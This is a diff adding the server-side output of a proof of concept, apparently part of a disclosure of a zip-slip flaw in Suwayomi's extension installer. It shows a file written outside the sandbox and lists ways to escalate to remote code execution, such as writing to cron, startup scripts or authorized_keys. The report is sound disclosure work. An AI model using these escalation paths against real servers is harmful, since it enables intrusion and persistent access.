@@ -1,0 +1,16 @@
+REQUEST: server-side result of the install (files on the Suwayomi host)
+
+  $ id
+  uid=1000(suwayomi) gid=1000(suwayomi) groups=1000(suwayomi),29(audio),44(video)
+
+  $ ls -l /tmp/suwa_pwned_zipslip
+  $ cat /tmp/suwa_pwned_zipslip
+
+RESPONSE: file written OUTSIDE the extensions sandbox
+
+  -rw-r--r-- 1 suwayomi suwayomi 33 Sep 27 13:57 /tmp/suwa_pwned_zipslip
+  ZIPSLIP-RCE-PoC-Kashish-Topiwala
+
+The attacker fully controls both the destination path and the file contents, as the
+Suwayomi process user. Writing to a startup script, a cron entry, ~/.ssh/authorized_keys,
+or overwriting the loaded extension .jar yields remote code execution.
